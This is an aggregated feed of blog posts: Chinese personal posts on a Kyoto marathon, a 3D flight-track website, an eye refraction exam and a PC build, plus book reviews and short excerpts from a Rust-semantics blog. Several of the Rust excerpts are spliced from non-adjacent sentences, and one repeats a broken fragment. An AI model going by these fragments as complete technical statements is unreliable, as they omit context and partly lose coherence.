届京都马拉松，不知道日本的其他马拉松的组织水平，京都马拉松每一段路的交通管制都做得十分精细，在半程之后，会在一些检查点提示这个点的关门时间。跑步进到京都的一个植物园，这里还有艺妓的表演。从植物园出来之后，开始进入鸭川的河滨小路，这里的道路就变得比较窄了，并排只能 2 人。路边的一个加油的团队，我与他们他互相招手了。到达一个有草莓的供给点，不得不说，跑到 30 多公里，能吃上一口酸甜的京都草莓，还是很爽的。最后 10 公里，我基本也就是走走停停，最后的 5 公里也是一个折返路段。到达最后 1 公里的时候，自拍留念。终于要到终点了，两边还是有很多加油的民众。踏过最终的终点线。老习惯，终点前自拍一张。京都马拉松有 1 万 6 千的参赛人数，由于我是在 G 区起跑，属于5小时左右的速度，一路周围看到各个年龄段的都有。完赛之后，有一个纪念的围脖。除了奖牌、围脖，还有一些补给品发放。我的第 10 块马拉松奖牌，也是我的第 2 块海外马拉松奖牌（第 1 块是 2018 年的泰国普吉岛马拉松)在终点更衣和休息区，还有专门的给手机充电的地方，这一点细节也是值得学习的地方。早上 9 点起跑，下午 2 点多完赛，更衣准备完之后，依旧接近下午 3 点，又累又饿，步行去京都四条附近看了看找餐厅，结果不是饭点，没找到合适的开门的餐厅，就先回酒店睡觉了。DAY4 京都・深圳​最后一天的行程，下午 4 点的航班返回深圳，倒也不急，早上 10 点退房之后，来到京都车站，准备在这里吃完饭再坐巴士去大阪的关西国际机场。京都车站有寄存柜，十分方便，直接刷 Apple Wallet 的西瓜卡就能解锁，也不太贵。小红书上搜了搜，也懒得再去其他地方逛了，去京都车站10楼的「拉面小路」，准备吃碗拉面。花了 3,500 日元，约 ¥180 人民币，点了一碗加满牛肉的拉面(我点的最贵的那个)和葱花煎饺，味道还不错。吃完饭，又上顶楼的观景台，与老婆来了个 FaceTime,感觉下次还可以再带老婆来京都好好玩玩。时候也不早了，这次不打算坐列车，定了巴士，京都到关西机场，约 ¥100 人民币，一路不堵车，差不多 1 个半小时到。在巴士上见到任天堂的大楼，搜了搜，才发现原来任天堂的总部就在这里。顺利登机，离开大阪。成绩​上次长沙马拉松 4 小时 56 分的成绩，这次 5 小时 07 分的成绩，在身体状态不佳的情况下，也算是「完赛」达成目标了。随想​京都，作为世界热门旅游城市和日本的文化古都，在这次马拉松之行中，我并未有足够时间深度游览。除了鸭川，其他知名景点基本上没去过。尽管周六那天我离伏见稻荷大社只有1公里远，但因为其他事务而无法步行前往。这次也没怎么拍照，全程基本就是 iPhone 14 Pro 出片，感觉还是有必要：再安排一次京都的观光行程，好好体验一下京都的文化。番外​在 YouTube 上想搜搜 Kyoto Marathon 的视频，分别发现了两个在 4.3km 和 13km处的长视频，记录了所有跑过的跑者。【4K】京都マラソン 2025 | Kyoto Marathon | 4.3Km地点 | 松尾橋 全ランナー | All runners at 4.3km【全員撮り】京都マラソン2025［KYOTO Marathon 2025・All runners］13㎞地点 【定点カメラ】通过分析配速和分段成绩，找到了自己在两个视频中出现的准确时间点，还是挺有趣的，国内马拉松好像还没见过类似的记录者，感觉有机会下次可以试一试。
Source: 罗磊的独立博客

**科普网站:航班在 3D 地球的飞行真实轨迹**
上周花了两天时间，用 Next.js 练手做项目，顺便做了一个科普网站。🌍Flight Track in 3D Earth经常坐飞机的朋友，尤其是坐过长距离国际航班的朋友，一定留意过飞机在地图上的轨迹。但是由于墨卡托投影的原因，航班在平面地图上的轨迹往往与我们心理上的感知不一致。这个网站的核心功能是展示航班在 3D 地球上的真实 GPS 轨迹，并与平面地图上的轨迹进行直观对比。这对于理解地图投影的影响特别有帮助，相信初中和高中的科学及地理老师会发现它的教学价值。同时也收集了几条「最长」的航线，当作展示案例。灵感来源​在阮一峰周刊第342期看到那张 EK215 航班跨越北极的航线图，感觉做一个 3D 效果的可能更加直观，于是做了这个科普性质的网站。使用了 threejs 和收费的 Flightradar24 API 制作了这个查询真实航班的小工具。后来发现 API 费用太贵，只好先屏蔽真实数据，改用模拟数据，但效果仍然很直观。在做这个小项目的这几天，我稍微了解了航旅的数据领域，感叹航空行业的标准化真令人佩服：全球统一的航班代码、机场代码和各种开放数据。同时，我也对航空数据服务的价格感到震惊。一开始我天真地以为 Flightradar24 每月 $9 美元能查 30,000 次挺划算（毕竟能缓存历史航班），结果才发现 Credit 并不是次数，实际请求 500 次不到就用完了，FlightAware 是按请求数计费。有关航旅这个部分，有一个推友留言，供参考:Nexa@nexa_li之前打算做相关产品，用OpenAI Deep research做了非常详细的产品调研，想要功能齐全费用不低的下午8:06 · 2025年4月11日03相关资料​Next.jsThree.js: Javascript 3D LibraryFlightradar24 API: 航旅数据FlightAware APIs: 航旅数据国家地区经纬度坐标：World countries全球机场代码:Airports
Source: 罗磊的独立博客

**眼科近视验光体验:深圳大学总医院**
距离上一次配眼镜已经过去五年，之前的眼镜一直戴到今天。蔡司的镜片依旧完好，而凯米镜片的那副眼镜因平时运动和不太爱惜，已经磨损得不成样子。是时候重新配眼镜了。ZEISS 三连：蔡司镜架、钻立方镜片、蔡司原厂加工近视眼镜从医学角度来看，成年后眼睛的近视一般不会加深。在过去十年里，我的眼镜度数基本没有变化。不过，我想既然要重新配眼镜，不如趁这个机会重新验光，了解一下自己眼睛的真实情况。职业背景：我是一个程序员，过去几年，大多情况下每天是高强度用眼。眼睛现状: 左右两眼均是 600°，并且都有轻微散光这次我没有选择常见的眼镜店验光，而是选择了去深圳大学总医院。为什么不选择眼镜店验光​由于线下商业的特点，眼镜里店的验光只是销售眼服务中的一个环节。尽管一些眼镜店配备专业验光人员和先进设备，但由于线下销售的性质以快速达成交易为目的，从理性角度来看，眼镜店的验光存在潜在问题。眼镜店可能仅进行简单的仪器验光，验光过程可能由普通店员完成。虽然验光师的资格考试不难，但在这种线下场景中，普通消费者通常不太会去确认验光师的资质。为什么不去专业的眼科医院验光​看到不少人推荐深圳眼科医院或者热门的眼科医院，我恰恰选择避开这些「热门」的医院。验光只是很基础的服务，对于医院和医生眼科方便的水平要求其实并不高，所以没必要选择那种专科医院。热门的眼科医院，倒容易存在人多排队的情况。人多和服务好很多情况下是互斥的。这次我选择了「深圳大学总医院」，一个是在西丽离得不远，而是新医院，硬件设施肯定没问题，加上新医院人不多，不用排队就诊、验光都很方便。流程​下面简单说一下这次在医院的验光流程。在「深圳大学总医院智慧医院」的小程序预约挂号。随便选「眼科门诊」的主治医师或者医师即可，挂号费25元。拿到挂号单之后，去到医院3楼的眼科门诊，把挂号单给到分诊台的护士，直接说「验光」，护士会先行使用仪器给你做当前戴着眼镜的验光。接下来等号去到医生的办公室，直接跟医生说「验光」即可，医生会先再次检查一下，然后开「验光单」去专门的验光室验光。直接门口的缴费机器缴纳「验光」费用，拿验光单回到分诊台，等叫号去验光室。接下来就是专业的验光流程，验光师也是专门的大夫，会先检测你当前的眼镜都市，然后再一次检查左右眼的都市和散光，尤其是散光会多次验证偏差角度。由于我眼镜都市600多，而今天的第一轮验光都市只有 550°，医生建议我需要再做一次散瞳，以便正确验光。接下来拿着「散瞳药」的单据缴费，再去楼下取散瞳的药。散瞳需要持续40分钟，每 10 分钟滴第一次，第4次滴完之后再等10分钟，再次去验光室。散瞳之后的验光，我的度数进一步下降到左右两眼 500°，与我当前眼镜 600° 的度数相差了 100°。鉴于我散瞳之后的验光度数下降过大，医生让我需要改天重新再次验光，以精准检查出适合的眼睛度数。我第二天又来医院，需要重新挂号，拿出昨天的检查单据给医生，直接说「过来复查验光」即可，医生会再开一个「验光单」，这次再去到验光室。与昨天一样，首先还是常规的左右眼近视度数、散光的检查。然后医生分别给我按照散瞳的度数 500°，给我调整试戴眼睛，我感觉 500° 看得有点不清楚，医生又调整到 550°，我就感觉清晰很多了。医生让我戴着出去走 10 分钟，看看远近，看手机，看看有没有什么不适的。我戴着550°的眼镜，发现与我600°的眼镜相比，清晰度差异不大。在标准验光距离，我能清晰看到验光表上5.0的小字，外出时也没有感到不适。医生的建议是：我当前眼睛的实际度数为500°，但由于一次性下降太多，近期可以先配550°的眼镜，待适应半年到一两年后，再慢慢降到500°。我询问医生和验光师，为什么之前几年600°时没有感到不适。医生表示这种情况很常见，许多人在验光时不够严谨，甚至在用眼一天后再去验光，结果可能相差300多度。我这五六年适应600°是因为眼睛本身有调节功能，但这个度数对我的眼睛肌肉压力过过大，长期来看还是有害的。花费​DAY1: 挂号¥25 / 门诊 ¥65 / 散瞳药 ¥17DAY2: 挂号¥25 / 门诊 ¥24总花费； ¥156额外花费: 停车¥10*2 = ¥20停车费用可以通过输入当日的门诊编号进行优惠减免，要不原价要 ¥30 多。注意​如果要做散瞳的话，建议就别开车了，另外可以戴一副墨镜，做完散瞳之后，2-4小时之内，都无法看清楚近处的东西，另外对阳光敏感。如果不做散瞳的话，一天就能搞定，花费能控制在¥100元以内。这次验光，整体还是满足了我的预期。纠正了我之前眼镜度数不准的大雷，只可惜了我之前花费巨资配的蔡司眼镜。
Source: 罗磊的独立博客

**我的新电脑: 2025 年 MATX 小主机**
距离我上一次装 PC 主机已经过去 7 年。我们中年男人真的是太难了，存了三个月的零花钱，在拼京淘东拼西凑，这里扣扣，那里省省，花费￥3200 巨资，终于把家里用了 7 年的老电脑做了个小小升级了。消费降级，没用 Intel 的高端 CPU，改用了小牌子 AMD，显卡也从之前的 80 系列降级到 70 系。🥹距离我上一次装 PC 主机已经过去 7 年。2018 年装了一台 ATX 主机，这台老电脑配置如下:CPU: i8700k主板: 技嘉 Z370 AORUS Gaming 3内存: 芝奇幻光戟 DDR3 3000 8GB *4硬盘: 三星 960EVO 500G显卡: EVGA GeForce GTX 1080电源: 海盗船 RM650x散热: 恩杰 NZXT Kraken X62机箱: NZXT S340 Elite当初这套配置还是比较顶，所以直到 2025 年的今天，日常用起来还是没什么问题，但是应对近几年的各种 3A 大作就颇有压力了。临近年中各大电商促销，加上AMD、英伟达等厂商今年推出的产品算是回到了一个合理乃至甜点的区间，今年就动了重新装一台 PC 主机的念头。装机思路​我是一个程序员，长期以来，我的主力设备都是 Mac，现在用的 MacBook Pro 16 英寸是 M2 Max / 96BG / 4TB 的配置，性能还是十分强大的，所以这次装 PC 主机，主要有几个想法：利用已有的配件（固态硬盘）、MATX小机箱，不用水冷，不追求极致性能或极致性价比，力求在合理价格区间组装一台适合自己的主机，能够应对当前主流的3A大作以及可能的视频剪辑和直播需求，作为一个稳定的偏娱乐工作站。一开始也有考虑 Ultra 265K 的 Intel CPU + N 卡的组合，但是考虑到英特尔去年的缩缸，Ultra 这一代的支持时间，乃至目前岌岌可危的股价，最终决定还是转向市场上更成熟的 AMD 处理器。最终配置​组件品牌型号购买渠道备注CPUAMDAMD Ryzen 7 9700X（盒装)京东板U套装优惠主板技嘉B850M AORUS ELITE WIFI7 ICE - P(雕妹)京东2025年5月15日上市，冰雕换皮内存宏碁掠夺者 PREDATOR 48G(24G×2) 套装 DDR5 6000频率 Hermes冰刃京东6000/C28 新M-die 颗粒固态硬盘1海力士 SolidigmP44 Pro 2TB NVMe已有PCIe 4.0 ,Mac Mini 外接闲置固态硬盘2海康威视C2000 Pro 1TB已有PCIe 3.0 ,购于2019年，东芝颗粒显卡铭瑄 MaxsunGeForce RTX 5070 iCraft OC12G T0天猫电源九州风神PQ850P京东白金全模组电源，850W散热九州风神冰立 AK500S 数显版京东5热管,带数显屏机箱乔思伯Z20 MATX 白色京东经典 MATX 小机箱，约20L机箱风扇利民TL-S12-W/RW 120MM ARGB 12cm机箱风扇 * 6京东正向4把，反向2把等各个配件送到家，再集体拍张合照的的感觉还是很不错的。整机展示​这次装机主色调是「白色」，但是我并没有追求「纯白」，最后出来的整机效果基本达到了我的预期。乔思伯 Z20 是很经典的 MATX 小机箱，在装机领域口碑很不错，体积也不大，刚好在我的心水范围内。Z20 一侧是钢化玻璃，其余三名是带孔的金属网格，内部有防尘罩，整体看起来简洁大气。机箱正面的电源开关、 Type-C 接口和 USB 3.0 ，还有一个音频接口，孔比较少，对于我来说有点不够用。机箱背部还附送了一个小的带有磁铁的防尘罩，可以贴到机箱背部。机箱内部主要配件和布局，使用的都是各个配件自带的线材。九州风神这个电源附送了压纹线和理线夹，稍微把显卡、主板供电线理了一下。这次使用了宏碁的冰刃 24GB*2 的套条，频率 6000MHz，时序 C28，使用的是海力士 3GB 新 M-die 颗粒，相比 32GB 的只贵了¥100不到，果断就选择了这个，毕竟我 7 年前的老电脑都 32GB 了，如果再装一台 32GB 的，感觉有点不够意思。CPU 风冷散热外接线，用白色电工胶布包了一下，稍微美观了一点。这次之所以不用水冷，主要是图省事，之前那台老机器的恩杰水冷坏过一次，虽然免费换新了，但是从原理的角度水冷相比风冷的故障率还是高一些，现在风冷水冷对于这种级别的机器散热效率差别不太大，这次就选择风冷了。九州风神 AK500S 这个风冷价格不贵，颜值还行，我用利民的 S-12 换了风冷自带的风扇，统一机箱内的风扇风格。显卡是铭瑄的 RTX 5070 iCraft OC12G 瑷珈，之所以选择铭瑄的显卡，一是之前买了一张铭瑄的 Intel B580 感觉还行，再就是这次铭瑄的铭瑄 5070 价格很香，要不从颜值的角度，肯定还是诸如技嘉雪鹰 5070 更好看，但是架不住铭瑄这个便宜不少。铭瑄这个虽然也是白色系显卡，但是顶部是二次元元素，仔细看的话底部有点泛黄的设计，不是纯白，但是塞进机箱后看得就不明显了。来到晚上灯光展示，我不是一个 RGB 爱好者，但是可以不用，但是不能没有，这次我还是给内存、以及风扇都选择了 RGB 效果，机箱内部采用了上2出、后1出、下2进的风道布局，机箱上的 6 把风扇都接到了 ARGB 集线器，可以通过额外的遥控器控制，也可以通过主板同步。内存、显卡、风扇的灯光都可以同步，可以根据自己的心情和喜好调整灯光动效、颜色、明暗。九州风神这个风冷有一个小的 LED 屏幕，安装了软件之后，可以显示 CPU 温度、CPU 占有率灯信息，但是比较遗憾的是这个风冷只有淡绿色的灯，不能与其他 ARGB 灯光同步。我的 ARGB 集线器上也有一个小的 LED 灯，也能同步，透过背部露出来隐隐约约的效果还行。装机过程​接下来再分享一下一些装机过程中的配件细节。这次我本来是想购买技嘉 B850M 冰雕的，但是没想到刚好看到技嘉 B850M 雕妹上市，规格就是冰雕换皮，但是升级了 Wi-Fi 7 的芯片，价格甚至还便宜了几十块钱，果断入手。雕妹这个主板整体大部分是白色的，但是在一些散热马甲上有技嘉的橙黑元素，不像冰雕整体纯白那么干净。但是因为我本身不追求纯白，加上有预期装机完成之后大部分都会被挡住，就没有太在意。支持安装两个 M2 固态硬盘，上面有一个支持快拆的 M2 固态硬盘散热片，下面的 M2 固态硬盘也支持快拆，不用再用螺丝固定。这次我用的两个固态硬盘都是已有的老硬盘，其中海力士 Solidigm P44 Pro 2TB 之前是 Mac Mini 的外接硬盘，算是 PCIe 4.0 的顶级固态了，放到现在依旧是高端水准，海康威视那个 C2000 Pro 1TB 是 2019 年买的，虽然是 PCIe 3.0 的，但是也足够日常使用了，我之前就是放在老电脑上专门放游戏。B850M 雕妹支持 4 根 DDR5 内存条，这部分也是白色卡槽。板U套装的 9700X。想起上次装机的时候安装 CPU 手抖了，把主板的针脚搞弯了，这次特别小心，好在现在优化了设计，直接傻瓜放进去扣上就好了。宏碁的内存条，48GB，应该能满足我的大部分需求了。上板之后的效果。散热器这部分没什么好说了的，安装好 AMD 专用的支架之后，涂规制，直接安到了主板上。九州风神的 pq850p 电源，850W 白金全模组电源，本来我这个规格 750W 也够了，但是想到也没差多少钱，就又换了 850W 的。PQ850P 这个风扇口碑还行，颜值我比较喜欢。理线效果​这次是我第一次装 MATX 小机箱，走线和理线成了一个大问题。这次我依旧是自己亲自动手装机，也是投入了心血，还是想着能够尽量美观。上面就是最终的走线效果，由于机箱内有6个 ARGB 风扇，加上有一个 ARGB 集线器需要 SATA 单独供电，整体线材比较多，CPU供电线、主板供电线围绕机箱外部走了一圈，风扇之类的小线、机箱前置的延伸线之类的，大多就是分类扎起来，尽量藏在了电源下部的空间。这次用到的主要理线工具，白色扎带、网线钳刀、白色电工胶布。当然还有电源送的理线架。性能跑分​由于我装机之后，立马就装了不少软件、游戏，并不是纯净系统的状态，所以跑分结果可能有些偏差，实际看下来与专门的评测有 3% 到 7% 左右的差距。整体就是主板和系统的默认配置，开启 EXPO，CPU 功耗限制开启 105W。图吧硬件和系统信息如上。CPU 和 GPU 的信息，看了下 CPU 核心电压 1.0-到1.1 左右波动，看着体质还行的样子？CPU-Z 压力测试​用 CPU-Z 简单进行基准跑分测试，左边是默认 TDP 65W 模式下的跑分，右边是开启 TDP 105W 模式的跑分，解锁功耗之后提升约 10% 左右，最大看到功率跑到 140W 的样子。Cinebench R23​同样跑一个 Cinebench R23 的多核和单核测试:TDP 65W 模式: 单核 2179,多核 19055TDP 105W 模式PBO 开启35负压: 单核 2180,多核 22624一开始我的主板只开启了 TPD 105W 功耗墙，这里的跑分与其他人 R23 单核 2200+，多核 23000 + 还是有不小差距。后来手动调整了一下 PBO 的负压到30,再跑一次方多核就上升到了 22624。3DMark CPU Profile​3DMark CPU Profile 最大线程 9978,1线程 12563DMark Time Spy Extreme​Time Spy Extreme 分数 9940。3DMark Time Spy​Time Spy 分数 20476。双烤:TDP 105W​在开启 TDP 105W 和 PBO Auto ( BIOS 默认) 的情况下，使用 AIDA 64 FPU + Furmark 4K 双烤，15 分钟。CPU达到 95° 温度墙，GPU 核心在72-74摄氏度， GPU显存 64-6 摄氏度。这个温度确实有点高，除了 CPU 本身的原因，另一个原因可能是 AK500S 风冷的风扇。我替换的利民 TL-S12 风扇最高转速只有 1500 rpm，风压为 1.31，而原本九州风神自带的风冷风扇最高转速为 1850 rpm，风压为 2.19，这显然是为了颜值牺牲了散热效率。不过，这个温度仍在预期范围内，当然在大多数情况下，不可能长期在这种工况下运行。有关 9700x 使用 AK500s 烤鸡的测试，可以参考 B 站的这个视频:9700X，九州风神ak500s烤鸡实测这个视频的指定评论有 UP 主详细的各个条件的温度表现，这么看来我这个温度应该也是正常。黑神话悟空​4K 分辨率，超高画质、开启 DLSS、关闭光线追踪，平均帧率90帧。2K 分辨率，超高画质，开启 DLSS，关闭光线追踪，平均帧率 116 帧。其他游戏​现在的硬件在规格差不多的情况下，游戏性能的差距都不大，加上我本身玩的游戏不多，这几天新装电脑之后，也只是玩了玩网游永劫无间、无畏契约、三角洲行动、DOOM 毁灭战士、使命召唤黑色行动6、33号远征队。我的显示器只是 4K 60帧，加上我对高帧无感。实测下来。三角洲行动: 2K，超高画质，DLSS,能够达到 250- 300帧。永劫无间: 2K，中低画质，DLSS开启2x，能够达到 200到 300 帧最新出的毁灭战士:黑暗时代，4K + DLSS 基本也能达到 170帧的水平。总结​这次装机前，我准备了不少资料，断断续续在抖音、B站和小红书上查看了许多装机方案。简单来说，CPU、主板和内存的组合基本上只有几种，而显卡的选择则因个人预算差异较大。其他配件如电源、机箱、风扇和散热器则主要看个人喜好（这也是水分较多的地方）。整体配置看下来，基本符合我的预期，除了显卡，其他配件都没有使用低配，算是比较均衡。最终的跑分虽然与评测有差距，但我觉得主要是我的设置问题。由于我并不追求极致的跑分和性能，在目前的硬件水平下，我新装的这台 MATX 基本可以流畅运行 2K 游戏，算是达成了我的心愿。
Source: 罗磊的独立博客

**Pointers Are Complicated III, or: Pointer-integer casts exposed**
Pointers Are Complicated III, or: Pointer-integer casts exposed

In my previous blog post on pointer provenance, I have shown that not thinking carefully about pointers can lead to a compiler that is internally inconsistent: programs that are intended to be well-behaved get miscompiled by a sequence of optimizations, each of which seems intuitively correct in isolation. That means the program with the casts replaced by transmutation is UB, because the ptr it ends up dereferencing has invalid provenance. For the sake of the entire ecosystem I mostly hope that LLVM will make some choice so that we can, eventually, leave this limbo state we are currently in.
Source: Ralf's Ramblings

**The last two years in Miri**
The last two years in Miri

It has been almost two years since my last Miri status update. This was crucial for std’s park() and unpark() , but meanwhile is also used for many other synchronization primitives.

and , but meanwhile is also used for many other synchronization primitives. :D
Source: Ralf's Ramblings

**Announcing: MiniRust**
Announcing: MiniRust

I have been thinking about the semantics of Rust – as in, the intended behavior of Rust programs when executed, in particular those containing unsafe code – a lot. Translating it to real Rust means we can actually execute the reference interpreter and test it, and translating it to Coq means we can start proving theorems about it. :)
Source: Ralf's Ramblings

**A New Beginning**
A New Beginning

I have some very exciting news to share: starting November 1st, I will work at ETH Zürich as an assistant professor! Becoming a professor in the first place is a dream come true, and becoming a professor at a place like ETH Zürich is not something I even dared to dream of. I probably used up all my Karma points for the rest of my life, and will do my best to honor this privilege. :)
Source: Ralf's Ramblings

**cargo careful: run your Rust code with extra careful debug checking**
cargo careful: run your Rust code with extra careful debug checking

Did you know that the standard library is full of useful checks that users never get to see? There are plenty of debug assertions in the standard library that will do things like check that char::from_u32_unchecked is called on a valid char , that CStr::from_bytes_with_nul_unchecked does not have internal nul bytes, or that pointer functions such as copy or copy_nonoverlapping are called on suitably aligned non-null (and non-overlapping) pointers. Of course Miri is much more thorough and cargo careful will miss many problems (for instance, it cannot detect out-of-bounds pointer arithmetic – but it does perform bounds checking on get_unchecked slice accesses).

Note that for now, some of these checks (in particular for raw pointer methods) cause an abrupt abort of the program via SIGILL without a nice error message or backtrace. :)

By the way, I am soon starting as a professor at ETH Zürich, so if you are interested in working with me on programming language theory as a master student, PhD student, or post-doc, then please reach out!
Source: Ralf's Ramblings

**From Stacks to Trees: A new aliasing model for Rust**
From Stacks to Trees: A new aliasing model for Rust

Since last fall, Neven has been doing an internship to develop a new aliasing model for Rust: Tree Borrows. However, note that TB only allows this if there is an addr_of_mut (or addr_of ) immediately in the body of a function! If a reference &mut x is created, and then some other function derives a raw pointer from that, those raw pointers do get invalidated on the next write to x . If you run into any surprises or concerns, please let us know! The t-opsem Zulip and the UCG issue tracker are good places for such questions.

That’s all I got, thanks for reading – and a shout out to Neven for doing all the actual work here (and for giving feedback on this blog post), supervising this project has been a lot of fun! Remember to read his write up and watch his talk.
Source: Ralf's Ramblings

**Talk about Undefined Behavior, unsafe Rust, and Miri**
Talk about Undefined Behavior, unsafe Rust, and Miri

I recently gave a talk at a local Rust meetup in Zürich about Undefined Behavior, unsafe Rust, and Miri. It targets an audience that is familiar with Rust but not with the nasty details of unsafe code, so I hope many of you will enjoy it! Have fun. :)
Source: Ralf's Ramblings

**Google Open Source Peer Bonus**
Google Open Source Peer Bonus

We are all used to spam emails, supposedly from Google, that say “You won” and I just need to send all my data to somewhere to receive my lottery payout. I have donated the amount in full to noyb, who I’m sure will be using it for good.

Update (2024-01-07): In fact, this is already my second Google Open Source Peer Bonus. /Update
Source: Ralf's Ramblings

**Sandboxing All The Things with Flatpak and BubbleBox**
Sandboxing All The Things with Flatpak and BubbleBox

A few years ago, I have blogged about my approach to sandboxing less-trusted applications that I have to or want to run on my main machine. I wrote a small wrapper around bubblewrap to make this configuration a bit more convenient to write and manage; this project is called BubbleBox. Thanks a lot to everyone involved!
Source: Ralf's Ramblings

**What is a place expression?**
What is a place expression?

One of the more subtle aspects of the Rust language is the fact that there are actually two kinds of expressions: value expressions and place expressions. In particular, * works on a value expression (so we need load other_ptr to obtain the value stored in this place) and produces a place expression (so we need to load again to obtain a value expression that we can use with + ). Introducing temporaries here is very unlikely to produce a meaningful result, so there’s no good reason to accept such code.

Conclusion
Source: Ralf's Ramblings

**Rustlantis: Randomized Differential Testing of the Rust Compiler**
Rustlantis: Randomized Differential Testing of the Rust Compiler

The first paper produced entirely by my group has recently been published at OOPSLA. The core part of this work was done by Andy (Qian Wang) for his master thesis. In total, he found 22 new bugs in the Rust compiler, 12 of them in the LLVM backend that has already been extensively fuzzed by prior work.

To learn more, check out the paper or watch Andy’s talk (the timestamp link seems unreliable, seek to the 5h40min mark if it doesn’t do that automatically).
Source: Ralf's Ramblings

**Program Logics à la Carte**
Program Logics à la Carte

The first paper by a PhD student I supervise has been accepted into POPL: “Program Logics à la Carte” will be presented in Denver next week. This is built in Iris, and is similar to how Iris provides reusable building blocks for the ingredients of a powerful separation logic—but so far, everything directly related to the actual language had to be re-done for each new language. By using ITrees as shared foundation, we show how this can be overcome.

Congratulations, Max, on making it into POPL! To learn more, check out the paper.

Update: A recording of the talk is now available online.
Source: Ralf's Ramblings

**现实不似你所见 量子引力之旅**
豆瓣链接

又一本读起来很爽，欲罢不能的书。除了熟悉的希腊哲学到经典物理，再到现代物理（相对论和量子物理）的故事（书中讲的相对简略些，但有不同的角度。这部分也可以看曹天元的“上帝掷骰子吗"，同样十分精彩，讲的故事更多），本书主要重点讲了最前沿的“圈量子引力学”，也即试图融合相对论和量子力学的一个理论。作者目前更相信这个圈理论，而不是当今火热的弦/膜理论。当然，这些是已知和未知的交界，目前还没有绝对的优势和证据确定哪方是正确的。

曾经年少时，也有物理梦。从初中，正是接触开始，到高中时达到顶峰。自认为还有些聪明，对科学十分感兴趣，物理当然是科学王冠上的明珠。那种解释和预测世界的能力，还有不断颠覆你世界观的发现，令人颅内高潮迭起。那些物理先贤们的故事，充满了吸引力和震撼，令我崇拜和向往。不是生物、化学、地理这些可以比拟的。可能也就数学可以更牛逼吧。当然，最终还是从理想主义，越来越现实主义了。大学还是选了赚钱多，好找工作的计算机专业。从此”一入侯门深似海，从此萧郎是路人“, 转眼已过10年时间。不过选择还是正确的，一路上见了太多物理转码的朋友。当然也有坚持物理道路的同学，在做高能物理，也有做量子计算机的。所以，作为爱好物理和科学的门外汉，很享受这种阅读物理科普书籍的感觉，那种更新的哲学和视角，让人可以不在乎现实世界的烦恼，单纯享受作为智慧生命的快乐。
Source: YoungForest's blog

**埃隆·马斯克传 Elon Musk**
豆瓣链接

放弃英文版，转到翻译版果然是个正确的选择。38万字，一周看完，太爽了。尤其是从2000后第一个十年那段，关于SpaceX和Tesla的初创阶段，真的是振奋人心，改变人类历史进程的冒险。相比原版，是有些删减的，主要是关于中国部分。我对照着看了下，其实不多，为了过审可以理解。

全书其实可以分为几个部分：

71-94: 南非的成长，移民妈妈的祖籍加拿大，转学美国宾夕法尼亚。

95-02: 互联网泡沫，转战硅谷创业，公司黄页Zip2, 支付网络X.com, PayPal

00-10: 我最喜欢的部分，关于SpaceX和Tesla的初创阶段。尤其是SpaceX，真是靠一己之力改变整个行业和美国，仍是私有企业，甚至不用上市融资。

10-20: Tesla和SpaceX 的成熟阶段。虽然也有星舰和Model 3+Y，但没那么激动人心了。同期还有人工智能OpenAI，脑机接口 Nerolink，挖隧道公司 Boring Company,

21-23: 最后的几年，作者写的很详细。主要还是作者为了写传记一直跟着马斯克这几年，有很多信息和资料。收购推特是其中最引人注目的剧情。推特员工真是从天堂掉入地狱，私有化后，被裁75%。不像Tesla 和 SpaceX的工程师，他们一开始就在马斯克手下，已经习惯了。推特真是天降暴君。作为一名程序员，真是十分同情他们。

看完之后不敢坐特斯拉了，马斯克为了节省成本太拼了。他有一套5步工作法，用来加速制造和节省成本。简单来说，就是质疑一切标准（行业标准，国家标准），删掉尽可能多的东西（删掉后，如果不行，再拿回来。如果拿回来的东西不够删的10%，说明删的不够多）。比如本来行业标准应该拧4棵螺丝，他就拧2棵，认为够了，一测试，也没问题。他做事情很激进。给我一种国服领导人的感觉，喜欢搞运动式生产，各种大跃进。造火箭也是类似的。炸了没事儿，都是实验，快速推动测试。

正如书中所说，没有马斯克的话，电动车也会出来，只是晚十年。但火星殖民可能会晚更多。甚至在人类灭亡之前能不能出去也未可知。人类是在和AI赛跑。AI的优势在于发展快，但人类有先发优势，积累很多。在地球呆着或早或晚要灭绝。就像卡尔萨根说的那样，人类要么遍布星辰大海，要么彻底灭绝，没有中间状态。我对人类文明的未来还是充满希望的。

更坚定了我All in TSLA的信念。今天股价176，市值5600亿美元。我的成本 190。
Source: YoungForest's blog

**Just Keep Buying 持续买进**
豆瓣链接

很不错的投资书籍，和“金钱心理学”有些像。用很多数据和回测说服读者。

我收益最多的几个点是：

有钱就买，不要等。择时没用。

不要买个股，买大盘。超额收益不切实际，大概率无法达到。

房地产并不是一个好的经济上的资产（房产回报并没有大家想象的那么高），但有很多其他精神和社会上的好处，比如稳定的生活。

运气对投资太重要了。你出生的国家，时代，决定了你成年后的国际大环境。还有是退休前最后几年的收益，对退休后的收益和生活影响很大。

资产中，时间才是最重要的。也就是“一寸光阴一寸金，寸金难买寸光阴”。

年轻时，思考人生和关注事业更重要，尤其是头10年是收入增长最快的。投资是后来才更重要的事情。正如“史记 货殖列传”中所讲“是以无财作力，少有斗智，既饶争时，此其大经也。”。没有钱财只能出卖劳力，稍有钱财便玩弄智巧，已经富足便争时逐利，这是常理。

人本身年轻时是成长股，年老时是价值股。
Source: YoungForest's blog

**网飞三体有感：质疑程心，理解程心，成为程心**
最近网飞版的三体火了，誉谤满身。我也没看，不好评价，但勾起了我和三体的往事回忆。

三体的小说。我还是在大概十年前，在沙河图书馆看的。当时虽然还没有得雨果奖，三体系列已经在慢慢变火了。当时印象中还是，一开始书名是 “地球往事 之 三体，黑暗森林，死神永生”。三体虽然只是第一部和其中虚拟现实游戏得名字，但因为太火了，就慢慢变成了整个系列得名字。搞笑的是，图书馆里只能借到第一部和第三部，第二部永远预约不到。因此，我读的顺序是 一，三，二。还看了宝树狗尾续貂得 三体X。我对三部书的喜爱顺序是：死神永生>黑暗森林>三体。也算入了科幻坑，之后看了大刘的其他小说。也接触了阿西莫夫的“基地”和“银河帝国”系列，中篇“永恒的终结”，都十分不错，推荐给大家。

